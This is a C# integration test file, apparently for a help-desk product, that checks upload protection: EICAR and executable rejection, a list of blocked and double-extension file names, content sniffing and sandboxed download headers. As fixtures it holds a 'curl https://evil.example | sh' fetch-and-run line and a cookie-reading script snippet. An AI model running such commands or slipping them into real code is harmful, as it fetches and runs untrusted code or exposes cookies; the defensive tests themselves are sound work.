using System.Net;
using System.Net.Http.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using SupportDesk.Contracts.Tickets;
using SupportDesk.Domain.Customers;
using SupportDesk.IntegrationTests.Infrastructure;
using SupportDesk.IntegrationTests.Portal;
using SupportDesk.Persistence;
using static SupportDesk.IntegrationTests.Security.SecurityTestKit;

namespace SupportDesk.IntegrationTests.Security;

/// <summary>
/// Upload protection: malware (EICAR), executables by extension and by content, double extensions, content-type
/// sniffing (declared types are never trusted) and the plan's size limit — for agents and portal contacts — plus the
/// headers attachments are served with.
/// </summary>
[Collection("api")]
public sealed class UploadProtectionTests(DeskApiFactory factory)
{
    private static readonly byte[] Png = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==");
    private static readonly byte[] Pe = [(byte)'M', (byte)'Z', 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8];
    private static readonly byte[] Html = Ascii("<html><body><script>alert(document.cookie)</script></body></html>");

    [Fact]
    public async Task Eicar_is_rejected_for_agents_and_portal_contacts_and_nothing_is_stored()
    {
        var t = await factory.CreateTenantAsync();
        var admin = await t.AdminClientAsync();
        var r = await admin.UploadAsync(Eicar(), "readme.txt", "text/plain");
        Assert.Equal("file_infected", await AssertClientErrorAsync(r, HttpStatusCode.UnprocessableEntity));

        // Hidden inside a larger file, too.
        var padded = Ascii(new string('a', 4096)).Concat(Eicar()).Concat(Ascii(new string('b', 4096))).ToArray();
        Assert.Equal("file_infected", await AssertClientErrorAsync(await admin.UploadAsync(padded, "log.txt", "text/plain"), HttpStatusCode.UnprocessableEntity));

        var customer = await factory.CustomerAsync(t, "Upload Retail");
        var (_, contact) = await factory.ContactAsync(t, customer.Id, customer.HeadOffice, PortalAccessScope.Own, "Upload Contact");
        var portal = await contact.UploadAsync(Eicar(), "invoice.pdf", "application/pdf", $"/api/v1/portal/{t.Slug}/files");
        Assert.Equal("file_infected", await AssertClientErrorAsync(portal, HttpStatusCode.UnprocessableEntity));

        var stored = await factory.InTenantAsync(t.Id, sp => sp.GetRequiredService<DeskDbContext>().StoredFiles.CountAsync());
        Assert.Equal(0, stored);
    }

    [Theory]
    [InlineData("setup.exe")]
    [InlineData("SETUP.EXE")]
    [InlineData("invoice.pdf.exe")]       // double extension: looks like a PDF when extensions are hidden
    [InlineData("photo.jpg.scr")]
    [InlineData("report.docx.js")]
    [InlineData("payload.ps1")]
    [InlineData("macro.xlsm")]
    [InlineData("page.html")]
    [InlineData("vector.svg")]
    [InlineData("shortcut.lnk")]
    [InlineData("installer.msi.")]        // trailing dot is trimmed (Windows ignores it)
    [InlineData("invoice.exe ")]          // trailing space likewise
    public async Task Blocked_types_and_double_extensions_are_rejected(string fileName)
    {
        var t = await factory.CreateTenantAsync();
        var admin = await t.AdminClientAsync();
        var r = await admin.UploadAsync(Ascii("harmless bytes"), fileName, "application/octet-stream");
        Assert.Equal("file_type_blocked", await AssertClientErrorAsync(r, HttpStatusCode.UnprocessableEntity));
    }

    [Theory]
    [InlineData("invoice.pdf")]
    [InlineData("notes.txt")]
    [InlineData("invoice.exe.pdf")]       // executable disguised behind a document extension
    [InlineData("data.bin")]
    public async Task Executable_content_is_rejected_whatever_the_name(string fileName)
    {
        var t = await factory.CreateTenantAsync();
        var admin = await t.AdminClientAsync();
        Assert.Equal("file_type_blocked", await AssertClientErrorAsync(await admin.UploadAsync(Pe, fileName, "application/pdf"), HttpStatusCode.UnprocessableEntity));
        var elf = new byte[] { 0x7F, (byte)'E', (byte)'L', (byte)'F', 2, 1, 1, 0 };
        Assert.Equal("file_type_blocked", await AssertClientErrorAsync(await admin.UploadAsync(elf, fileName, "text/plain"), HttpStatusCode.UnprocessableEntity));
        var script = Ascii("#!/bin/sh\ncurl https://evil.example | sh\n");
        Assert.Equal("file_type_blocked", await AssertClientErrorAsync(await admin.UploadAsync(script, fileName, "text/plain"), HttpStatusCode.UnprocessableEntity));
    }

    [Fact]
    public async Task Declared_content_types_are_not_trusted()
    {
        var t = await factory.CreateTenantAsync();
        var admin = await t.AdminClientAsync();

        async Task<string> StoredTypeAsync(byte[] bytes, string name, string declared)
        {
            var r = await admin.UploadAsync(bytes, name, declared);
            var body = await r.JsonAsync(HttpStatusCode.OK);
            return body!["contentType"]!.GetValue<string>();
        }

        // HTML pretending to be an image or a PDF is stored as an opaque binary (never rendered).
        Assert.Equal("application/octet-stream", await StoredTypeAsync(Html, "photo.png", "image/png"));
        Assert.Equal("application/octet-stream", await StoredTypeAsync(Html, "statement.pdf", "application/pdf"));
        Assert.Equal("application/octet-stream", await StoredTypeAsync(Html, "page.bin", "text/html"));
        Assert.Equal("application/octet-stream", await StoredTypeAsync(Html, "page.bin", "application/xhtml+xml"));
        // A .txt stays text/plain even when declared as HTML.
        Assert.Equal("text/plain", await StoredTypeAsync(Html, "notes.txt", "text/html"));
        // Real image bytes are recognised by their magic number, whatever the declared type.
        Assert.Equal("image/png", await StoredTypeAsync(Png, "scan.dat", "application/octet-stream"));
    }

    [Fact]
    public async Task Size_limit_of_the_plan_is_enforced_while_streaming()
    {
        var t = await factory.CreateTenantAsync();
        await factory.InTenantAsync(t.Id, async sp =>
        {
            var db = sp.GetRequiredService<DeskDbContext>();
            var sub = await db.Subscriptions.FirstAsync();
            sub.LimitOverridesJson = """{"MaxAttachmentMb":1}""";
            await db.SaveChangesAsync();
        });
        var admin = await t.AdminClientAsync();

        var atLimit = new byte[1024 * 1024];
        Random.Shared.NextBytes(atLimit);
        atLimit[0] = (byte)'x'; // not a magic number
        Assert.Equal(HttpStatusCode.OK, (await admin.UploadAsync(atLimit, "exactly-1mb.log", "text/plain")).StatusCode);

        var over = new byte[1024 * 1024 + 1];
        over[0] = (byte)'x';
        Assert.Equal("file_too_large", await AssertClientErrorAsync(await admin.UploadAsync(over, "too-big.log", "text/plain"), HttpStatusCode.RequestEntityTooLarge));

        // Empty files are refused as well.
        Assert.Equal("file_empty", await AssertClientErrorAsync(await admin.UploadAsync([], "empty.txt", "text/plain"), HttpStatusCode.UnprocessableEntity));
    }

    [Fact]
    public async Task Attachments_download_as_sandboxed_nosniff_files()
    {
        var t = await factory.CreateTenantAsync();
        var admin = await t.AdminClientAsync();
        var ticket = await admin.CreateTicketAsync("Attachment headers");
        var upload = await (await admin.UploadAsync(Html, "page.bin", "text/html")).JsonAsync(HttpStatusCode.OK);
        var fileId = Guid.Parse(upload!["fileId"]!.GetValue<string>());
        var note = await admin.PostAsJsonAsync($"/api/v1/tickets/{ticket.Id}/notes", new NoteRequest { BodyHtml = "<p>see file</p>", AttachmentFileIds = [fileId] }, J);
        Assert.True(note.IsSuccessStatusCode, await note.Content.ReadAsStringAsync());
        var attachments = await admin.GetJsonAsync($"/api/v1/tickets/{ticket.Id}/attachments");
        var attachmentId = attachments!.AsArray().Single()!["id"]!.GetValue<string>();

        foreach (var url in new[] { $"/api/v1/attachments/{attachmentId}/download", $"/api/v1/attachments/{attachmentId}/download?inline=true" })
        {
            var r = await admin.GetAsync(url);
            Assert.Equal(HttpStatusCode.OK, r.StatusCode);
            Assert.Equal("application/octet-stream", r.Content.Headers.ContentType?.MediaType);
            Assert.Equal("attachment", r.Content.Headers.ContentDisposition?.DispositionType);
            Assert.Equal("nosniff", r.Headers.GetValues("X-Content-Type-Options").Single());
            Assert.Contains("sandbox", r.Headers.GetValues("Content-Security-Policy").Single());
        }

        // Another tenant cannot fetch it by id.
        var other = await (await factory.CreateTenantAsync()).AdminClientAsync();
        Assert.Equal(HttpStatusCode.NotFound, (await other.GetAsync($"/api/v1/attachments/{attachmentId}/download")).StatusCode);
        // Nor attach someone else's upload to their own ticket.
        var theirs = await other.CreateTicketAsync("Steal a file");
        var steal = await other.PostAsJsonAsync($"/api/v1/tickets/{theirs.Id}/notes", new NoteRequest { BodyHtml = "<p>x</p>", AttachmentFileIds = [fileId] }, J);
        var attached = await other.GetJsonAsync($"/api/v1/tickets/{theirs.Id}/attachments");
        Assert.True(!steal.IsSuccessStatusCode || attached!.AsArray().Count == 0, "a foreign file id must never be attached");
    }
}
